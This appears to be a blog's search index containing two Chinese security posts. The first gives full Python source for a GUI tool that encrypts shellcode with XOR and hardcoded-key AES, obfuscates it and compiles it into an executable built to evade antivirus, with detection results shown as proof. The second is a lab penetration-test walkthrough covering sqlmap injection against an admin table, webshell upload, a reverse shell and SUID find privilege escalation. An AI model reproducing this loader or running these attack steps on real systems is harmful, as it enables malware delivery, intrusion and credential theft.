<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>“免杀shellcode加载器——加密混淆系列”</title>
    <link href="/2023/03/24/%E2%80%9C%E5%85%8D%E6%9D%80shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E2%80%94%E2%80%94%E5%8A%A0%E5%AF%86%E6%B7%B7%E6%B7%86%E7%B3%BB%E5%88%97%E2%80%9D/"/>
    <url>/2023/03/24/%E2%80%9C%E5%85%8D%E6%9D%80shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E2%80%94%E2%80%94%E5%8A%A0%E5%AF%86%E6%B7%B7%E6%B7%86%E7%B3%BB%E5%88%97%E2%80%9D/</url>
    
    <content type="html"><![CDATA[<h3 id="Python加载shellcode免杀介绍"><a href="#Python加载shellcode免杀介绍" class="headerlink" title="Python加载shellcode免杀介绍"></a>Python加载shellcode免杀介绍</h3><p>Python的简单易用使得它成为了许多免杀工具的首选语言。它可以轻松地处理shellcode，进行加密和混淆。使用Python实现各种加密也相对简单，且免杀效果较好。但是，Python编译生成的exe文件较大，这是它唯一的不足之处（本文将介绍如何缩小Python代码）。<br>VirusTotal：<br><img src="/../images/20230324172413.png"><br>微步：<br><img src="/../images/20230324172811.png"></p><h3 id="加载器脚本源码介绍"><a href="#加载器脚本源码介绍" class="headerlink" title="加载器脚本源码介绍"></a>加载器脚本源码介绍</h3><p>用于将指定的Python代码进行加密、混淆、编译成exe可执行文件。</p><p>&#96;&#96;&#96;#<br>import tkinter as tk<br>from tkinter import filedialog<br>import requests<br>import os<br>import re<br>import json<br>import base64<br>from Crypto.Cipher import AES<br>import python_minifier<br>from pathlib import Path<br>def add_to_16(s):<br>    while len(s) % 16 !&#x3D; 0:<br>        s +&#x3D; ‘\0’<br>    return str.encode(s)<br>def aes_jiami(text):<br>    key &#x3D; ‘LeslieCheungKwok’<br>    aes &#x3D; AES.new(add_to_16(key), AES.MODE_ECB)<br>    encrypted_text &#x3D; str(base64.encodebytes(aes.encrypt(add_to_16(text))), encoding&#x3D;’utf8’).replace(‘\n’, ‘’)<br>    return encrypted_text<br>def xor_jiami(s, key):<br>    xor_s &#x3D; ‘’<br>    for i in s:<br>        xor_s +&#x3D; chr(ord(i) ^ key)<br>    return xor_s<br>def compile():<br>    payload_path &#x3D; entry1.get()<br>    with open(payload_path, ‘rb’) as f:<br>        data &#x3D; f.read()<br>        b64_data &#x3D; base64.b64encode(data)<br>    with open(‘payload.bs64’, ‘wb’) as f:<br>        f.write(b64_data)<br>        sc &#x3D; Path(‘payload.bs64’).read_text()<br>    with open(‘.&#x2F;aes-xor.txt’,’wb’) as f:<br>        f.write(aes_jiami(xor_jiami(sc, 35)).encode())<br>    with open(‘aes-xor.txt’, ‘r’) as f:<br>        jiami_sc &#x3D; f.read().strip()<br>    with open(‘main.py’, ‘r’) as f:<br>        content &#x3D; f.read()<br>    content &#x3D; content.replace(“jiami_sc &#x3D; ‘’”, f”jiami_sc &#x3D; ‘{jiami_sc}’”)<br>    mini_content &#x3D; python_minifier.minify(content)<br>    with open(‘main-mini.py’, ‘w’) as f:<br>        f.write(mini_content)<br>    url &#x3D; “<a href="https://pyob.oxyry.com/obfuscate&quot;">https://pyob.oxyry.com/obfuscate&quot;</a><br>    with open(“main-mini.py”, “r”) as f:<br>        source &#x3D; f.read()</p><pre><code class="hljs">payload = &#123;  &quot;append_source&quot;: False,  &quot;remove_docstrings&quot;: True,  &quot;rename_nondefault_parameters&quot;: True,  &quot;rename_default_parameters&quot;: False,  &quot;preserve&quot;: &quot;&quot;,  &quot;source&quot;: source&#125;headers = &#123;  &quot;Content-Type&quot;: &quot;application/json&quot;,  &quot;Referer&quot;: &quot;https://pyob.oxyry.com/&quot;,  &quot;Origin&quot;: &quot;https://pyob.oxyry.com&quot;&#125;response = requests.post(url, json=payload, headers=headers)json_obj = json.loads(response.text)dest_value=json_obj[&#39;dest&#39;]with open(&quot;main-mini-obfuscated.py&quot;, &quot;w&quot;) as f:   f.write(dest_value)os.rename(&quot;main-mini-obfuscated.py&quot;, &quot;main-mini-ob.py&quot;)print(response.text)os.system(&quot;pyinstaller.exe -Fw -i icon.ico --key=leslie --distpath=./dist main-mini-ob.py&quot;)</code></pre><p>root &#x3D; tk.Tk()<br>root.title(“shallcode加载器v1.0”)<br>root.geometry(“400x200”)<br>label1 &#x3D; tk.Label(root, text&#x3D;”选择payload.raw的路径:”)<br>label1.pack()<br>label2 &#x3D; tk.Label(root, text&#x3D;”可执行文件将生成在当前文件夹”)<br>label2.pack()<br>entry1 &#x3D; tk.Entry(root)<br>entry1.pack()<br>button1 &#x3D; tk.Button(root, text&#x3D;”raw”, command&#x3D;lambda: entry1.insert(tk.END, filedialog.askopenfilename()))<br>button2 &#x3D; tk.Button(root, text&#x3D;”编译”, command&#x3D;compile)<br>label1.pack(side&#x3D;tk.TOP, pady&#x3D;10)<br>label2.pack(side&#x3D;tk.TOP, pady&#x3D;10)<br>entry1.pack(side&#x3D;tk.TOP, pady&#x3D;10)<br>button1.pack(side&#x3D;tk.LEFT, padx&#x3D;60)<br>button2.pack(side&#x3D;tk.RIGHT, padx&#x3D;60, anchor&#x3D;’center’)<br>root.mainloop()<br>&#96;&#96;&#96;#</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>对某靶机环境进行渗透测试</title>
    <link href="/2022/11/28/%E5%AF%B9%E6%9F%90%E9%9D%B6%E6%9C%BA%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    <url>/2022/11/28/%E5%AF%B9%E6%9F%90%E9%9D%B6%E6%9C%BA%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<h2 id="此靶机根据某博彩网站的真实环境所搭建。"><a href="#此靶机根据某博彩网站的真实环境所搭建。" class="headerlink" title="此靶机根据某博彩网站的真实环境所搭建。"></a>此靶机根据某博彩网站的真实环境所搭建。</h2><h3 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h3><p>在VMwareWorkstation中导入虚拟机<br><img src="/../images/9c47491f80d2fe12fe91697501b1f82.png"></p><p>开启虚拟机并登陆root账号，并查看apache服务是否开启</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ps -ef |grep httpd<br>ps -aux | grep httpd<br></code></pre></td></tr></table></figure><p><img src="/../images/8108a693a1e75ef188444c52ad689fa.png"></p><p>查看ip地址</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ifconfig<br></code></pre></td></tr></table></figure><p><img src="/../images/a27143effacc23b122a0cd5c836d906.png"></p><h3 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h3><p>进入登录界面<br><img src="/../images/101110.png"></p><p>注册账号并进入网站<br><img src="/../images/101529.png"></p><p>点击商品<br><img src="/../images/103447.png"></p><p>url：<a href="http://192.168.206.128/index/goods/goods/pid/26/token/ad24fd9361665783a57e6f8be4ef67ce.html">http://192.168.206.128/index/goods/goods/pid/26/token/ad24fd9361665783a57e6f8be4ef67ce.html</a></p><p>发现参数pid后面的数字为注入点,用sqlmap跑出管理员账号密码(在指定注入的位置加上*）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -r target.txt  --prefix <span class="hljs-string">&quot;26)&quot;</span> --suffix <span class="hljs-string">&quot;%23&quot;</span> -D weipans -T wp_userinfo --dump<br></code></pre></td></tr></table></figure><p>target.txt内容:<br><img src="/../images/135657.png"></p><p>管理员密码的md5值:<br><img src="/../images/134520.png"></p><p>md5值解密：<br><img src="/../images/140639.png"></p><p>进入网站后台并在参数设置-基本设置处发现文件上传点:<br><img src="/../images/141259.png"></p><p>上传冰蝎马并通过查看页面源代码确定上传位置:<br><img src="/../images/143456.png"></p><p>连接冰蝎,利用命令执行反弹shell并利用suid提权:<br><img src="/../images/144813.png"></p><p>发现find有suid表示位，所以可以利用find提权：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> 111<br>find 111 -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">whoami</span> \;<br></code></pre></td></tr></table></figure><p>提权成功：<br><img src="/../images/154129.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
